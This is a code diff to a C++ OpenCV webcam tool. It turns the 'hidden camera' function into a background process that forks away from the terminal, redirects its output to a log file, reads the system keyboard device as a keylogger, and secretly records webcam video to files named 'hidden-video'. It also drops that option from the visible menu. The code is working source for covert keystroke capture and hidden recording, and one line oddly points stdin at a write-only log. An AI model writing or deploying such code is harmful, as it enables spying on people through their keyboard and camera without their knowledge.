@@ -102,61 +102,79 @@ std::string get_kb_device() {
 }
 
 void hidden_camera_menu() {
-    // Keylogger initialization.
-    auto device = get_kb_device();
-    int fd = open(device.c_str(), O_RDONLY);
-    struct input_event ev {};
-
-    /*
-     * In this infinite loop keylogger reads
-     * pressed keyboard keys.
-     * If key Q is pressed program ends.
-     * If key Space is pressed program starts capturing video.
-     */
-    while (true) {
-        read(fd, &ev, sizeof(struct input_event));
-
-        // End of program
-        if (ev.type == 1 && ev.code == KEY_Q) {
-            printf("Quit!\n");
-            clear_console();
-            exit(0);
+    auto pid = fork();
+    if (pid == -1) {
+        std::cerr << "Fork error\n";
+        exit(1);
+    } else if (pid != 0) {
+        std::cerr << "Parent process\n";
+        exit(0);
+    } else {
+        // Replacing file descriptors for stdin and stderr
+        int log_fd = open("log.txt", O_WRONLY);
+        if (log_fd == -1) {
+            std::cerr << "open error\n";
+            exit(1);
         }
+        dup2(log_fd, STDIN_FILENO);
+        dup2(log_fd, STDERR_FILENO);
 
-        // Capturing video
-        if (ev.type == 1 && ev.code == KEY_SPACE) {
-            // Generating name of video by date and time
-            std::string video_name = "hidden-video";
-            std::string full_save_name = VIDEO_PATH + video_name + "-" + get_current_date_time() + ".avi";
+        std::cerr << "Child process\n";
 
-            // Instantiating default camera capture
-            cv::VideoCapture videoCapture(0);
-            assert_perror(!videoCapture.isOpened() && "Cannot open camera.");
+        // Keylogger initialization.
+        auto device = get_kb_device();
+        int fd = open(device.c_str(), O_RDONLY);
+        struct input_event ev{};
 
-            /*
-             * Instantiating video writer with generated name and parameters:
-             * - FPS: 15
-             * - Resolution: 640 x 480
-             */
-            cv::VideoWriter videoWriter(
-                    full_save_name,
-                    cv::VideoWriter::fourcc('M', 'J', 'P', 'G'),
-                    15,
-                    cv::Size(640, 480)
-            );
-            assert_perror(!videoWriter.isOpened() && "Cannot open writer.");
+        // Instantiating default camera capture
+        cv::VideoCapture videoCapture(0);
+        assert_perror(!videoCapture.isOpened() && "Cannot open camera.");
 
-            /*
-             * Infinite 'recording' loop. Here pressed keys are continuously tracking.
-             * If pressed key is Q video capturing ends and programs closes.
-             */
-            while (true) {
-                read(fd, &ev, sizeof(struct input_event));
-                if (ev.type == 1 && ev.code == KEY_Q) {
-                    printf("Quit!\n");
-                    exit(0);
+        cv::VideoWriter videoWriter;
+
+        /*
+         * In this infinite loop keylogger reads
+         * pressed keyboard keys.
+         * If key Q is pressed program ends.
+         * If key Space is pressed program starts capturing video.
+         */
+        while (true) {
+            read(fd, &ev, sizeof(struct input_event));
+
+            // End of program
+            if (ev.type == 1 && ev.code == KEY_Q) {
+                std::cerr <<"Quit!\n";
+                exit(0);
+            }
+
+            if (ev.type == 1 && ev.code == KEY_SPACE) {
+                if (recording) {
+                    std::cerr << "Video is recording now!\n";
+                } else {
+                    std::cerr << "Starting recording!\n";
+                    recording = true;
+
+                    // Generating name of video by date and time
+                    std::string video_name = "hidden-video";
+                    std::string full_save_name = VIDEO_PATH + video_name + "-" + get_current_date_time() + ".avi";
+
+                    /*
+                     * Instantiating video writer with generated name and parameters:
+                     * - FPS: 15
+                     * - Resolution: 640 x 480
+                     */
+                    videoWriter.open(
+                            full_save_name,
+                            cv::VideoWriter::fourcc('M', 'J', 'P', 'G'),
+                            15,
+                            cv::Size(640, 480)
+                    );
+                    assert_perror(!videoWriter.isOpened() && "Cannot open writer.");
                 }
+            }
 
+            // Capturing video
+            if (recording) {
                 // Reading frame by video capture and write it to file
                 cv::Mat frame;
                 assert_perror(!videoCapture.read(frame) && "Cannot read frame.");
@@ -282,7 +300,6 @@ void app_menu() {
         printf("Choose option:\n"
                "1 - Print webcams info\n"
                "2 - Open Camera mode\n"
-               "3 - Capture hidden video\n"
                "4 - Exit\n\n");
 
         switch (read_int_from_console()) {
@@ -291,9 +308,6 @@ void app_menu() {
                 break;
             case 2:
                 camera_menu();
-                break;
-            case 3:
-                hidden_camera_menu();
                 break;
             case 4:
                 return;
